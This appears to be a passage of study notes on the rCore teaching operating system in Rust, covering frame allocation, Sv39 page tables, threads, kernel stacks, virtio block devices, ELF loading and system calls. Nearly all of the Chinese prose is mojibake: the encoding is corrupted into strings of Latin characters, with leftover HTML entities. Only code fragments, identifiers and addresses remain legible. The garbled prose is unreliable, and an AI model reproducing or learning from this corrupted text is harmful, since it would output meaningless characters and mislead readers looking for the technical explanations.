ç¼–è¯‘å™¨ä¾¿ä¼šè‡ªåŠ¨ä½¿ç”¨æˆ‘ä»¬æä¾›çš„å†…å­˜åˆ†é…å‡½æ•° å…ˆå¼€è¾Ÿä¸€ä¸ªu8æ•°ç»„ï¼Œå°†é¦–åœ°å€å’Œé•¿åº¦ä»˜ç»™æˆ‘ä»¬å®šä¹‰å¥½çš„å †å¯¹è±¡å³å¯ æ¢å¯»å†…æ ¸ä½¿ç”¨çš„ç»“å°¾åœ°å€ï¼Œlinker.ld è¯´æ˜äº†ç»“å°¾åœ°å€ä¸º kernel_end æˆ‘ä»¬å°†æ­¤å‡½æ•°å®ç°ï¼Œå¹¶å°†ä»–çš„åœ°å€ ä½œä¸º usize è¾“å‡ºçš†å¯ã€‚ ç‰©ç†é¡µçš„ç®¡ç†ä¸åˆ†é… é¡µé¦–åœ°å€æ»¡è¶³ 4kB çš„å€æ•° ï¼Œé¡µå· x4096 = é¡µé¦–åœ°å€ åˆ†é…çš„åœ°å€ä¸å­˜åœ¨å †æˆ–æ ˆä¸­ï¼Œæˆ‘ä»¬åˆ©ç”¨FrameTrackerå°è£…ï¼Œå®ç°ç±»ä¼¼äºBox çš„æ™ºèƒ½æŒ‡é’ˆçš„ç›¸å…³ç‰¹æ€§ï¼Œç›¸å½“äºæˆ‘ä»¬å¯¹é¡µå®ç°äº†ä»¥ä¸‹æ“ä½œï¼š å°è£…äº† &amp;&#39;static mut ç±»å‹çš„å¼•ç”¨ æä¾›äº† Drop å‡½æ•°ï¼Œå­˜åœ¨ç”Ÿå‘½å‘¨æœŸï¼Œè¶…å‡ºåè‡ªåŠ¨ææ„ éœ€è¦å¼•ç”¨è®¡æ•°åˆ™å¤–é¢å°è£… Arc é’ˆå¯¹æ‰€æœ‰çš„ç‰©ç†é¡µï¼Œæˆ‘ä»¬å®ç°äº†ä¸€ä¸ªç‰©ç†é¡µåˆ†é…å™¨å°è£…å¯¹é¡µçš„æ“ä½œ 1pub static ref FRAME_ALLOCATOR: Mutex&lt;FrameAllocator&lt;AllocatorImpl&gt;&gt; = Mutex::new(FrameAllocator::new(Range::from(PhysicalPageNumber::ceil(PhysicalAddress::from(*KERNEL_END_ADDRESS))..PhysicalPageNumber::floor(MEMORY_END_ADDRESS),))); Mutex&lt;FrameAllocator&lt;AllocatorImpl&gt;&gt; Mutexå¯¹åˆ†é…å™¨åŠ é”é˜²æ­¢å¤šä¸ªçº¿ç¨‹è®¿é—®ï¼Œ FrameAllocator ä¸ºä¸»è¦åˆ†é…å™¨ï¼Œ AllocatorImpl ä¸ºåˆ†é…å™¨ç®—æ³•ã€‚ PhysicalPageNumber::ceil(PhysicalAddress::from(*KERNEL_END_ADDRESS))..PhysicalPageNumber::floor(MEMORY_END_ADDRESS) åˆ†é…å™¨åˆ†é…çš„å†…å­˜èŒƒå›´ä» kerne_end ç»“æŸï¼ˆä¸Šå–æ•´ï¼‰å¼€å§‹åˆ° æˆ‘ä»¬å¯è®¿é—®å†…å­˜çš„æœ€åçš„ï¼ˆä¸‹å–æ•´ï¼‰ åˆ†é…å™¨ç®—æ³•åˆ©ç”¨çš„æ˜¯å®é™…ç‰©ç†é¡µå’Œèµ·å§‹åœ°å€çš„åç§»é‡ lab-3 ç®€å•æ€»ç»“åŸºç¡€å†…å®¹ - å…³äºé¡µè¡¨é¦–å…ˆï¼š ä¸ºä»€ä¹ˆè¦ç”¨åˆ°è™šæ‹Ÿåœ°å€ï¼Ÿç®€å•ç†è§£ï¼Œè¿™æ˜¯ä¸ºäº†æ–¹ä¾¿ç¨‹åºç¼–å†™è€…çš„ä¸€ç§æ–¹æ³•ã€‚æ¯”å¦‚æˆ‘çš„ç¨‹åºæƒ³è¦è¿è¡Œåœ¨è¿™ä¸ªæ“ä½œç³»ç»Ÿä¸Šï¼Œ æˆ‘å¸Œæœ›ä¸éœ€è¦è€ƒè™‘æ“ä½œç³»ç»Ÿçš„å®é™…å†…å­˜æƒ…å†µï¼Œéš¾é“æˆ‘è¿˜è¦çœ‹ä¸€ä¸‹æ“ä½œç³»ç»Ÿçš„ä»£ç ï¼Œæˆ–ç¿»ä¸€ä¸‹æ‰‹å†Œä¹ˆï¼Ÿ ï¼Œ æˆ‘å¸Œæœ›æˆ‘çš„ç¨‹åºç”¨çš„å°±æ˜¯ä» 0x1 å¼€å§‹çš„è¿ç»­åœ°å€ï¼Œé‚£ä¹ˆè¿™ä¸ª 0x1 å°±æ˜¯è™šæ‹Ÿåœ°å€ã€‚ é¡µè¡¨ï¼šä½†æ˜¯åœ¨æ“ä½œç³»ç»Ÿä¸­ï¼Œå®é™…è¿è¡Œæ—¶æ˜¯éœ€è¦ä½¿ç”¨å®é™…ç‰©ç†åœ°å€çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¦‚ä½•æ¨ç®—ç‰©ç†åœ°å€å‘¢ï¼Œæˆ‘ä»¬å¯ä»¥å°†è¿™ç§ï¼ˆè™šæ‹Ÿåœ°å€-ç‰©ç†åœ°å€ï¼‰çœ‹ä½œä¸€ç§å‡½æ•°ï¼ˆæ˜ å°„ï¼‰å…³ç³»f (è™šæ‹Ÿåœ°å€ï¼‰= ç‰©ç†åœ°å€ åœ¨å­˜å‚¨æ—¶ å°±æœ‰äº†ä¸¤ç§å‚¨å­˜çš„æ–¹æ³•ï¼Œ ç¬¬ä¸€ç§ æˆ‘ä»¬å°†è¿™ä¸ª f å‡½æ•°ï¼ˆç®€å•ç†è§£æ˜¯ä¸ªçº¿æ€§çš„ï¼‰å…³ç³»å‚¨å­˜ä¸‹æ¥ - ä¹Ÿå°±æ˜¯ æœ€å¼€å§‹ä¿®æ”¹å†…æ ¸ ä¸­ä½¿ç”¨çš„æ–¹æ³•ï¼Œ åªéœ€è¦ç»Ÿä¸€åŠ ä¸€ä¸ª åç§»é‡å³å¯ã€‚ ç¬¬äºŒç§ æˆ‘ä»¬å°†æ¯ä¸€ä¸ª ï¼ˆè™šæ‹Ÿåœ°å€-ç‰©ç†åœ°å€ï¼‰ ä¹Ÿå°± (x,y) æŒ‰å¯¹å­˜å‚¨èµ·æ¥ï¼Œé€šè¿‡æŸ¥æ‰¾ è™šæ‹Ÿåœ°å€ï¼Œä¾¿èƒ½è·å¾—ç›¸åº”çš„ç‰©ç†åœ°å€ã€‚ ç¬¬äºŒç§æ–¹æ³•ä¾¿æ˜¯æˆ‘ä»¬æ‰€è¯´çš„é¡µè¡¨ ï¼Œ ä»–æ˜¯ä¸€ï¼ˆå¤šï¼‰å¼ ï¼Œå­˜å‚¨è¿™ç§å…³ç³»çš„è¡¨ï¼Œé€šè¿‡æŸ¥è¡¨ä¾¿èƒ½å®Œæˆ æŸ¥æ‰¾ç‰©ç†åœ°å€çš„ä»»åŠ¡ã€‚ è€Œä¸”ï¼Œè™šæ‹Ÿåœ°å€ä¹Ÿæ˜¯å¯¹ç‰©ç†çš„åœ°å€çš„ä¸€ç§å°è£…æ–¹æ³•ï¼Œå¯ä»¥å®ç°å†…æ ¸å¯¹ç‰©ç†åœ°å€çš„æƒé™ç®¡ç†ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬åœ¨é¡µè¡¨é¡¹çš„æ ‡å¿—ä½ï¼Œå‡è®¾æˆ‘ä¸å¸Œæœ›ç³»ç»Ÿå†…æ ¸æ‰€åœ¨çš„åœ°å€è¢«å…¶ä»–äººå†™å…¥å…¶ä»–å†…å®¹ï¼Œæˆ‘åªéœ€è¦åœ¨é¡µè¡¨é¡¹ä¸Š å¤šçº§é¡µè¡¨ï¼šè¿™ç§æ–¹æ³•ä¸»è¦æ˜¯ä¸ºäº†èŠ‚çœå†…å­˜ï¼ŒåŒæ—¶å¯ä»¥æ–¹ä¾¿æˆ‘ä»¬ä¸ç”¨è·¨ç‰©ç†é¡µå»æŸ¥è¯¢è¿™å¼ è¡¨ã€‚é‚£ä¹ˆä»–ä¸ºä»€ä¹ˆå¯ä»¥èŠ‚çœå†…å­˜å‘¢ï¼Ÿä¸¾ä¸ªå°æ —å­ï¼š å†…æ ¸ä»£ç åœ¨è™šæ‹Ÿåœ°å€é‡Œ æ˜¯ 0xffffffff80200000 ï¼Œ åœ¨å®é™…ç‰©ç†åœ°å€æ˜¯ 0x80200000 ï¼Œ åœ¨æ™®é€šé¡µè¡¨ä¸­æˆ‘è¦è¿™ä¹ˆå­˜å‚¨ï¼Œ (0xffffffff80200000,0x80200000,flag) è¿™æ ·çš„ã€‚åŒæ ·åœ¨è¡¨ç¤ºå†…æ ¸ä»¥ 0xffffffff å¼€å¤´çš„è™šæ‹Ÿåœ°å€è¿˜æœ‰å¾ˆå¤šï¼Œè¿™æ ·ä¼šæ— å½¢ä¸­å¢åŠ å¾ˆå¤šçš„ç©ºé—´å¼€é”€ï¼Œä½†æˆ‘ä»¬çŸ¥é“ä¸æ–­å­˜å‚¨ 0xffffffff æ˜¯å†—ä½™çš„ã€‚æ‰€ä»¥æˆ‘ä»¬åˆ©ç”¨åˆ†çº§çš„æ–¹æ³•ï¼Œå¯ä»¥æŠŠé¡µè¡¨å˜æˆä¸‹é¢çš„å½¢å¼ï¼ˆç†è§£æ–¹æ³•ï¼‰ï¼š äºŒçº§é¡µè¡¨ ï¼ˆ0xffffffffï¼ˆè™šæ‹Ÿåœ°å€çš„é«˜ä½ï¼‰ï¼Œå­˜å‚¨ä¸‹é¢ä¸€çº§é¡µè¡¨çš„ç‰©ç†é¡µå·ï¼ˆé¦–åœ°å€ï¼‰ ï¼‰ ä¸€çº§é¡µè¡¨ ï¼ˆ0x80200000ï¼ˆä½ä½ï¼‰ï¼Œ0x80200000ï¼ˆç‰©ç†åœ°å€ï¼‰ï¼‰é€šè¿‡äºŒçº§é¡µè¡¨æŸ¥æ‰¾åˆ°ä¸€çº§é¡µè¡¨çš„å­˜å‚¨ä½ç½®ï¼Œå†é€šè¿‡ä½ä½æ‰¾åˆ°å¯¹åº”çš„ç‰©ç†åœ°å€ã€‚ é‚£ä¹ˆæˆ‘ä»¬å®é™…ä¸Šå¯¹äºæ‰€æœ‰ ä»¥å¼€å¤´ 0xffffffff å¼€å¤´çš„è™šæ‹Ÿåœ°å€ï¼ŒäºŒçº§é¡µè¡¨ä¸­æ°¸è¿œåªæœ‰ä¸€ä¸ªé¡µè¡¨é¡¹ï¼Œè¿™å°±èŠ‚çœäº†åŸæ¥æ¯æ¬¡éƒ½è¦æŠŠä»–å†™ä¸Šçš„ç©ºé—´ã€‚ ä»£ç éƒ¨åˆ† æ›´æ”¹ linker.ld çš„æ•°æ®å­˜æ”¾èµ·å€æ”¹ä¸ºè™šæ‹Ÿåœ°å€ï¼Œå¹¶åœ¨å„å­—æ®µåŠ å…¥å¯¹é½ï¼Œä½¿å¾—ä¸€ä¸ªè™šæ‹Ÿé¡µä¸ä¼šæœ‰ä¸¤ä¸ªæ®µã€‚ç›®çš„æ˜¯ä¸ºäº†å¯ä»¥å¯¹æ¯ä¸€ä¸ªæ®µèµ‹äºˆä¸åŒçš„å±æ€§ entry.asm ä¸­åˆ©ç”¨ ä¸‹é¢ä»£ç ä½¿å¾— CPUæ¨¡å¼ å˜ä¸º Sv39 12345# 8 &lt;&lt; 60 æ˜¯ satp ä¸­ä½¿ç”¨ Sv39 æ¨¡å¼çš„è®°å· li t1, (8 &lt;&lt; 60) or t0, t0, t1 # å†™å…¥ satp å¹¶æ›´æ–° TLB csrw satp, t0 ç»™å‡ºå†…æ ¸ä½¿ç”¨çº¿æ€§æ˜ å°„çš„åç§»é‡ å¹¶ åœ¨ entry.asm ä¸­ å»ºç«‹ä¸€ä¸ªboot_page_table ä½œä¸ºåˆå§‹é¡µè¡¨ï¼Œ ç¬¬ä¸€ä¸ªæ˜ å°„æ˜¯ 0x8000_0000 -&gt; 0x8000_0000 VPN3 æ˜¯ 10B æ‰€ä»¥æ”¾åœ¨ç¬¬ä¸‰ä½ ç¬¬äºŒä¸ªæ˜ å°„æ˜¯ 0xffff_ffff_8000_0000 -&gt; 0x8000_0000 VPN3 æ˜¯ 111111110B æ‰€ä»¥æ”¾åœ¨ 510ä½ ä¿å­˜ç¬¬ä¸€ä¸ªæ˜ å°„æ˜¯è¿åè§„åˆ™çš„ï¼Œä½†æ˜¯ä¸ºäº†æ‰§è¡Œ è¿™ä¸ªasmå†…çš„ä»£ç ï¼Œæ‰€ä»¥è¦å­˜åœ¨è¿™ä¸ªæ˜ å°„ã€‚ å°†è™šæ‹Ÿåœ°å€ åˆ†ä¸º 0..9 çš„VPN1 9..18çš„VPN2 18..27çš„VPN3 é¡µè¡¨é¡¹ ï¼šPageTableEntry = æ ‡å¿—ä½+é¡µå· |å¯¹ ç‰©ç†é¡µå·è¿›è¡Œå°è£… é¡µè¡¨ ï¼šPageTable |è£…æ»¡ä¸€ä¸ªç‰©ç†é¡µçš„é¡µè¡¨é¡¹æ•°ç»„ é¡µè¡¨æ™ºèƒ½æŒ‡é’ˆï¼šPageTableTracker å› ä¸ºé¡µè¡¨å¤ªå¤§äº†ï¼Œæ‰€ä»¥åˆ©ç”¨ä¸Šæ–‡æä¾›çš„å·¥å…· FrameTracker ï¼Œå°†è¿™ä¸ªé¡µè¡¨å½“æˆä¸€ä¸ªç‰©ç†é¡µçœ‹å¾…ï¼Œåˆ©ç”¨â€œæ™ºèƒ½æŒ‡é’ˆâ€å¯¹å…¶è¿›è¡Œæ“ä½œã€‚ å†…å­˜æ®µï¼šSegment |åœ¨å¾ˆå¤šæƒ…å†µä¸‹è™šæ‹Ÿé¡µçš„å•ä½é‡çº§å¤ªå°äº†ï¼Œæˆ‘ä»¬å¯¹å†…å­˜çš„ç®¡ç†å¯èƒ½ä¸€æ¬¡æ¶‰åŠå¾ˆå¤šé¡µï¼Œä¸ºäº†ç®€åŒ–æ“ä½œï¼Œæˆ‘ä»¬å°†å¾ˆå¤šè™šæ‹Ÿé¡µç»Ÿä¸€å°è£…ä¸ºä¸€ä¸ªSegmentï¼Œå®ƒå…·æœ‰ä»¥ä¸‹å±æ€§ ä¸¤ç§ç®€å•çš„æ˜ å°„ç±»å‹ ï¼š çº¿æ€§æ˜ å°„ å’Œ æ¯ä¸€å¸§éƒ½æœ‰æ˜ å°„ æ˜ å°„åˆ°çš„ä¸€å—è¿ç»­çš„è™šæ‹Ÿåœ°å€ ç»Ÿä¸€çš„æƒé™æ ‡è¯† å®é™…åº”ç”¨çš„æ˜ å°„å…³ç³»ï¼šMapping | å®Œæˆäº†åŸºç¡€çš„ç»“æ„å®šä¹‰ï¼Œé‚£ä¹ˆæˆ‘ä»¬è¯¥å®é™…çš„å¯¹æ¯ä¸ªçº¿ç¨‹çš„æ˜ å°„å…³ç³»è¿›è¡Œå°è£…å¹¶å®Œæˆå®é™…çš„æ“ä½œå’Œç»“æ„äº†ï¼š ä¿å­˜äº† é¡µè¡¨å‘é‡ ï¼Œ æ ¹é¡µè¡¨ç‰©ç†é¡µå·ï¼Œ æ˜ å°„ä¿¡æ¯ find_entry() å®ç° ç»™å®šè™šæ‹Ÿé¡µå·æŸ¥æ‰¾ç‰©ç†é¡µå· map() å®ç°äº†å®é™…æ•°æ®ï¼ˆæœªå†™å…¥é¡µä¸­ï¼‰çš„å†™å…¥å¹¶æ„å»ºæ˜ å°„ çº¿æ€§åˆ™åˆ©ç”¨ æˆ‘ä»¬address.rs ä¸­è§„å®šçš„æ–¹å¼ç›´æ¥è½¬æ¢ Framed åˆ™ åˆ†å‰²æ•°æ® ï¼Œ æ›´æ–°é¡µè¡¨ï¼Œå†™å…¥ç‰©ç†é¡µï¼Œ å°†æ˜ å°„å…³ç³»å†™å…¥æ˜ å°„ activate() å®ç°äº†å°†é¡µè¡¨èµ·ä½¿åœ°å€å†™å…¥satp ï¼Œä½¿ç”¨Sv39æ¨¡å¼å¹¶ åˆ·æ–°TLB å®ç°å†…æ ¸çš„é‡æ˜ å°„ ï¼šMemorySet ï¼š åˆ©ç”¨æˆ‘ä»¬å·¥ä½œæ›¿ä»£åŸæ¥çš„è›®å¤·ï¼Œ lab-4 çº¿ç¨‹ï¼šThread | çº¿ç¨‹æ˜¯æˆ‘ä»¬å…³æ³¨çš„å®é™…æ‰§è¡Œä»£ç çš„å•ä½ï¼Œæ•™ç¨‹çš„å®šä¹‰åŒ…æ‹¬ çº¿ç¨‹ ID - å”¯ä¸€æ ‡è¯†çº¿ç¨‹çš„èº«ä»½ çº¿ç¨‹çš„æ ˆ - çº¿ç¨‹å æœ‰ä¸€æ®µçš„è™šæ‹Ÿç©ºé—´æ¥è¿›è¡Œåˆ©ç”¨ æ‰€å±çš„è¿›ç¨‹ ä»£è¡¨è‡ªèº«æƒ…å†µçš„å¯å˜å˜é‡ï¼ˆMutexï¼‰- åŒ…æ‹¬ è¿è¡Œä¸Šä¸‹æ–‡ï¼Œæ˜¯å¦ä¼‘çœ ï¼Œç»“æŸç­‰å±æ€§ ï¼Œ åˆ©ç”¨ Mutex æ¥åŒ…è£…ä½¿å¾— Arc&lt;Thread&gt; ä¿å­˜çš„çº¿ç¨‹ä¸­çš„è¿™äº›å€¼å¯ä»¥è¢«æˆ‘ä»¬ä½¿ç”¨ã€‚ è¿›ç¨‹ï¼š Process | èµ„æºè°ƒåº¦çš„åŸºæœ¬å•ä½ï¼Œåªéœ€è¦ä¿å­˜è‡ªèº«å±æ€§å’Œ çº¿ç¨‹å…±äº«é¡µè¡¨ï¼Œå†…å­˜ç©ºé—´å³å¯ å±äº ç”¨æˆ·æ€ è¿˜æ˜¯ å†…æ ¸æ€ å…±ç”¨çš„ ä¸€å— å†…å­˜ç©ºé—´ï¼Œé¡µè¡¨ çº¿ç¨‹ç®¡ç†å™¨ï¼šProcessor | å­˜æ”¾å’Œç®¡ç†æ‰€æœ‰çš„çº¿ç¨‹ï¼Œä¸»è¦åŒ…æ‹¬ï¼š æ­£åœ¨æ‰§è¡Œçš„çº¿ç¨‹ è°ƒåº¦å™¨ å¯¹çº¿ç¨‹å®ç°è°ƒåº¦ï¼ŒåŒ…æ‹¬çº¿ç¨‹çš„æ·»åŠ ï¼Œç§»é™¤ï¼Œè¿›è¡Œä¸‹ä¸€ä¸ª ä¼‘çœ çº¿ç¨‹-å¤„äºç­‰å¾…çŠ¶æ€çš„ä¸€äº›çº¿ç¨‹ å®ç°å…¨å±€çš„ï¼Œç”±Lockå°è£…çš„ç®¡ç†å™¨ï¼Œæˆ‘ä»¬åˆ©ç”¨Mutexå’Œ å…³é—­æ—¶é’Ÿä¸­æ–­ ä¿è¯ä»–ä¸€ç›´åœ¨çº¿ é€šè¿‡è®¾ç½®Contextè¿›è¡Œä¸€ä¸ªå°çš„å®éªŒï¼Œè¿›è¡ŒéªŒè¯å¹¶æ‰§è¡Œ mv sp a0 , é€šè¿‡ __restore ä¼ å…¥ä¸€ä¸ªå‚æ•°-å³æˆ‘ä»¬ç²¾å¿ƒæ¶‰åŠçš„Context åŸæ¥æˆ‘ä»¬æ˜¯åœ¨å®éªŒä¸­ä¸ºäº†éªŒè¯ä¸­æ–­è€Œå¼€å¯äº†ä¸­æ–­ï¼Œç°åœ¨æˆ‘ä»¬å°†å…¶æ”¾åœ¨äº†çº¿ç¨‹å¼€å§‹æ—¶ ä¸­æ–­å¤„ç† ï¼š | çº¿ç¨‹åˆ‡æ¢å®é™…ä¸ºæ—¶é’Ÿä¸­æ–­çš„è¿‡ç¨‹ï¼Œæˆ‘ä»¬éœ€è¦åœ¨ä¸­æ–­å¤„ç†æ—¶å®Œæˆåˆ‡æ¢ å®šä¹‰çš„ç®¡ç†å™¨PROCESSORå®Œæˆå½“å‰çº¿ç¨‹çš„ ä¸Šä¸‹æ–‡ çš„ä¿å­˜ ç®¡ç†å™¨ä¸ºæˆ‘ä»¬åˆ†é…ä¸‹ä¸€ä¸ªåº”è¯¥è°ƒç”¨çš„è¿›ç¨‹ï¼Œå¹¶å°†ä»–çš„ä¸Šä¸‹æ–‡è¿”å› é€šè¿‡ __restore è½¬æ¢ å¦‚æœæ²¡æœ‰ä¸‹ä¸€ä¸ªçº¿ç¨‹ï¼Œåˆ™å¯åŠ¨ä¼‘çœ çº¿ç¨‹ï¼Œéƒ½æ²¡æœ‰åˆ™é€€å‡º çº¿ç¨‹çš„ç»“æŸï¼š| é€šè¿‡è®¾ç½® ra æ—¶çº¿ç¨‹é¡ºåˆ©ç»“æŸ åŸæ¥çº¿ç¨‹ç»“æŸè§¦å‘Exception::InstructionPageFault ï¼Œè·³è½¬ 0x0 é€šè¿‡è§¦å‘ä¸­æ–­ï¼Œé€šçŸ¥æ“ä½œç³»ç»Ÿè¿›è¡Œé‡Šæ”¾ï¼Œecall è°ƒç”¨ ebreak å°†ä¸­æ–­åŒ…è£…åœ¨ç»“æŸå‡½æ•°ä¸­ï¼Œæ ‡è®°çº¿ç¨‹ç»“æŸï¼Œå¹¶è®¾ç½®çº¿ç¨‹ç»“æŸçš„ ra å†…æ ¸æ ˆï¼š | ä½†å‘ç”Ÿä¸­æ–­æ—¶ï¼Œä¼šåˆ‡æ¢åˆ°å†…æ ¸æ€ï¼ŒåŸæ¥ç”¨äºå¤„ç†ä¸­æ–­çš„spæŒ‡é’ˆéœ€è¦ä¸€ä¸ªå†…æ ¸æ ˆï¼Œä¸“é—¨ç”¨äºåœ¨å†…æ ¸æ€æ‰§è¡Œå‡½æ•° - é˜²æ­¢çº¿ç¨‹çš„å´©æºƒå¯¼è‡´æ“ä½œç³»ç»Ÿçš„å´©æºƒ åªéœ€è¦ä¸€ä¸ªå†…æ ¸æ ˆï¼Œå› ä¸ºåªæœ‰ä¸­æ–­æ—¶ä½¿ç”¨å†…æ ¸æ ˆï¼Œè€Œä¸ä¼šæœ‰ä¸¤ä¸ªçº¿ç¨‹åŒæ—¶ä¸­æ–­ å†…æ ¸æ ˆçš„åœ°å€ä¸èƒ½æ”¾åœ¨é€šç”¨å¯„å­˜å™¨ä¸­ï¼Œè€Œsscratchåªæœ‰å†…æ ¸æ€èƒ½è®¿é—®ï¼Œæ¯”è¾ƒåˆé€‚ å®é™…çš„åšæ³•: å®šä¹‰kernel_stackåˆ†é…ç©ºé—´ï¼Œinterrupt.asmä¸­å¯¹sscratchæ“ä½œ ä¸ºå†…æ ¸æ ˆåˆ†é…ä¸€æ®µç©ºé—´ è¿è¡Œçº¿ç¨‹æ—¶ï¼Œå°†å†…æ ¸æ ˆæŒ‡é’ˆä¿å­˜åœ¨sscratchå¯„å­˜å™¨ä¸­ ä¸­æ–­æ—¶ï¼Œåˆ™ä»å°† Context å‹å…¥ sscratch æŒ‡å‘çš„æ ˆä¸­ï¼ˆContext çš„åœ°å€ä¸º sscratch - size_of::&lt;Context&gt;()ï¼‰ï¼ŒåŒæ—¶ç”¨æ–°çš„æ ˆåœ°å€æ¥æ›¿æ¢ spï¼ˆæ­¤æ—¶ sp ä¹Ÿä¼šè¢«å¤åˆ¶åˆ° a0 ä½œä¸º handle_interrupt çš„å‚æ•°ï¼‰ ä»ä¸­æ–­ä¸­è¿”å›æ—¶ï¼ˆ__restore æ—¶ï¼‰ï¼Œa0 åº”æŒ‡å‘**è¢«å‹åœ¨å†…æ ¸æ ˆä¸­çš„ Context**ã€‚æ­¤æ—¶å‡ºæ ˆ Context å¹¶ä¸”å°†æ ˆé¡¶ä¿å­˜åˆ° sscratch ä¸­ è¿è¡Œæ—¶å¦‚ä½• å°†å†…æ ¸æ ˆæŒ‡é’ˆä¿å­˜åœ¨sscratchä¸­? lab-5 ä¸èƒ½ä¸€ç›´è¿è¡Œå†…æ ¸ ï¼Œæˆ‘ä»¬è¦å®ç°æŠŠè¯»å–å­˜å‚¨è®¾å¤‡çš„æ•°æ®ï¼ŒOpenSBI è¿›è¡Œæ‰«æå¹¶è®¾å¤‡é€šè¿‡MMIOæ˜ å°„åˆ°ç‰©ç†å†…å­˜çš„ä¸€å—äº†ï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨rust_main ä¸­æ·»åŠ å‚æ•°ï¼ŒOpenSBI å°±ä¼šå‘Šè¯‰æˆ‘ä»¬æ˜ å°„çš„åœ°å€ _hart_id: 0, dtb_pa: PhysicalAddress(0x82200000) é€šè¿‡è°ƒç”¨ rcore ä¸­çš„ å±æ€§è§£ædevice_treeåº“ï¼Œæˆ‘ä»¬å¾—åˆ°çš„ä¾¿æ˜¯ä¸€ä¸ª å»ºå¥½çš„æ ‘ - è®¾å¤‡æ ‘ é€šè¿‡ é€’å½’ ä»æ ¹èŠ‚ç‚¹è¿›è¡Œé€’å½’ ï¼Œå‘ç°æ”¯æŒ &quot;virtio,mmio&quot; ï¼Œ å°±å¯ä»¥åŠ è½½ä»–çš„é©±åŠ¨ åˆå§‹åŒ–è®¾å¤‡ æ—¶éœ€è¦è¿›è¡ŒéªŒè¯Magic Number ï¼Œ ç¡®å®šå…¶ä¸ºè®¾å¤‡æ ‘ è¿›ä¸€æ­¥å¯¹èŠ‚ç‚¹è¿›è¡Œåˆ¤æ–­ï¼Œ åªè¯»å–å…¶ä¸­çš„ Block å—è®¾å¤‡ ç²’åº¦ ä¸º æ•´å—ï¼Œä»¥å—ä¸ºå•ä½è¯»å†™ï¼Œï¼ˆç±»æ¯”ç¡¬ç›˜ï¼‰ å®ç°ä¸º DMA åˆ†é…ç‰©ç†é¡µçš„å®šä¹‰å’Œæ“ä½œ åŒ…æ‹¬ ç‰©ç†åœ°å€-è™šæ‹Ÿåœ°å€çš„è½¬æ¢ï¼Œ åˆ†é…å’Œå»é…æ“ä½œ æŠ½è±¡è®¾å¤‡ é©±åŠ¨çš„æ¥å£ ï¼Œç®€å•çš„ä¸‰ç§æ–¹æ³• ï¼š è¯»å–è®¾å¤‡ä¿¡æ¯ å—è®¾å¤‡æ¥å£ è¯»å–æŸä¸ªå— åˆ° buffer ä¸­ï¼Œ å®ç°å¯¹æ•°æ®çš„è¯»å– å°† buffer çš„æ•°æ® å†™å…¥ æŸä¸ªå—ï¼Œ å®ç°å†™æ•°æ® å¯¹å—è®¾å¤‡çš„æŠ½è±¡ï¼ŒåŸºæœ¬ä¸ºå®ç°ä¸Šè¿° çš„ ä¸‰ä¸ªæ¥å£ã€‚ æ–‡ä»¶ç³»ç»Ÿ åˆ©ç”¨ rcore-fs é€šè¿‡æŸ¥æ‰¾å…¨éƒ¨è®¾å¤‡é©±åŠ¨ä¸­çš„ç¬¬ä¸€ä¸ªå­˜å‚¨è®¾å¤‡ä½œä¸ºæ ¹ç›®å½•ã€‚ åŒæ—¶è°ƒç”¨BlockCache::new() ä½¿å¾—è®¾å¤‡åœ¨å†…å­˜ä¸­å…·æœ‰cache æœ€å é€šè¿‡ è°ƒç”¨ ä»¥å®ç°çš„æ¥å£ä¸­çš„ ls è¿›è¡Œ æ–‡ä»¶åçš„è¾“å‡º lab-6 å»ºç«‹ user crateï¼Œä½œä¸ºç”¨æˆ·ç¨‹åºçš„æ”¾ç½®ä½ç½® - å¹¶ä¸ºå…¶å»é™¤ä¾èµ– é€šè¿‡ rcore-fs-fuse å°†æˆ‘ä»¬çš„ç”¨æˆ·ç¨‹åºç¼–è¯‘æ‰“åŒ…ä¸º ELF æ–‡ä»¶-è½¬æ¢ä¸º QCOW_FILE æ ¼å¼ åˆ©ç”¨ xmas_elf è§£æå™¨å°† ELF æ–‡ä»¶è¯»åˆ°å†…å­˜ä¸­ï¼Œè§£æå­—æ®µï¼Œå»ºç«‹å†…æ ¸æ˜ å°„ï¼ˆèƒ½ä¸­æ–­ï¼‰ ä¿®æ”¹Mapping::map å‡½æ•° ï¼Œ å¢åŠ  init_dataå‚æ•°ä¸ºåˆå§‹åŒ–æ•°æ® åŠ¨æ€åˆ†é…å†…å­˜ - åˆ†é…çš„ä¸ä¸€å®šè¿ç»­ - åˆ©ç”¨å¸§åˆ†é…çš„æ–¹å¼ è€ƒè™‘ å¦‚æœæœ€åå‰©ä¸‹çš„æ•°æ®ä¸æ»¡è¶³ä¸€é¡µçš„æƒ…å†µ åŠ è½½åˆ°å†…å­˜æ—¶ï¼Œ å¯¹ .bss æ®µè¿›è¡Œåˆå§‹åŒ– åˆ©ç”¨æ±‡ç¼–å‚æ•°çš„ä¼ é€’ï¼Œå®ç°ç³»ç»Ÿè°ƒç”¨ï¼Œä»ç›¸åº”çš„å¯„å­˜å™¨ä¸­å–å‡ºè°ƒç”¨ä»£å·å’Œå‚æ•°ï¼Œæ ¹æ®è°ƒç”¨ä»£å·ï¼Œè¿›å…¥ä¸åŒçš„å¤„ç†æµç¨‹ï¼Œå¾—åˆ°å¤„ç†ç»“æœ å›æ•°å€¼å¹¶ç»§ç»­æ‰§è¡Œï¼š è¿”å›å€¼å­˜æ”¾åœ¨ x10 å¯„å­˜å™¨ï¼Œsepc += 4ï¼Œç»§ç»­æ­¤ context çš„æ‰§è¡Œ ç¨‹åºè¿›å…¥ç­‰å¾… åŒæ ·éœ€è¦æ›´æ–° x10 å’Œ sepcï¼Œä½†æ˜¯éœ€è¦å°†å½“å‰çº¿ç¨‹æ ‡è®°ä¸ºç­‰å¾…ï¼Œåˆ‡æ¢å…¶ä»–çº¿ç¨‹æ¥æ‰§è¡Œ ç¨‹åºç»ˆæ­¢ ä¸éœ€è¦è€ƒè™‘ç³»ç»Ÿè°ƒç”¨çš„è¿”å›ï¼Œç›´æ¥åˆ é™¤çº¿ç¨‹ ç¼–å†™æ–‡ä»¶çš„è¾“å…¥è¾“å‡ºæµ stdin stdout å®ç°æ¡ä»¶å˜é‡ï¼Œæ›¿ä»£åŸæ¥çš„é˜»å¡å¼ï¼Œå¢åŠ 